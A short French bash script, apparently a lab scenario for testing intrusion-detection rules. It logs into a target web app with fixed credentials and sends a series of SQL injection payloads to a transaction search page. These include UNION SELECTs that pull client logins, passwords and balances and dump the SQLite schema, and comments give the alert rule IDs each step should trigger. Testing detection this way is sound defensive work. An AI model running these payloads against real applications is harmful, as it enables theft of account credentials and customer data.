#!/bin/bash
# Scénario 3 — Injection SQL sur la recherche de transactions (MITRE T1190 Exploit Public-Facing Application)
# Attendu : 100110 (motif SQLi dans l'URL), 100111 (erreur SQL applicative), 100112 (extraction de données)
CIBLE=${CIBLE:-cible}
J=/tmp/sqli.txt
curl -s -c $J -o /dev/null -d "login=amoukouama&password=Brazza2026" "http://$CIBLE/index.php"
for payload in "'" "' OR '1'='1" "%' UNION SELECT login,password,solde FROM clients--" "' AND sqlite_version()--" "%' UNION SELECT name,sql,1 FROM sqlite_master--"; do
  enc=$(printf %s "$payload" | jq -sRr @uri 2>/dev/null || python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload" | sed 's/ /%20/g;s/'"'"'/%27/g')
  echo "[*] Charge : $payload"
  curl -s -b $J "http://$CIBLE/compte.php?q=$enc" | grep -o '<td>[^<]*</td>' | head -6 | sed 's/<[^>]*>//g' | paste -sd' ' -
done
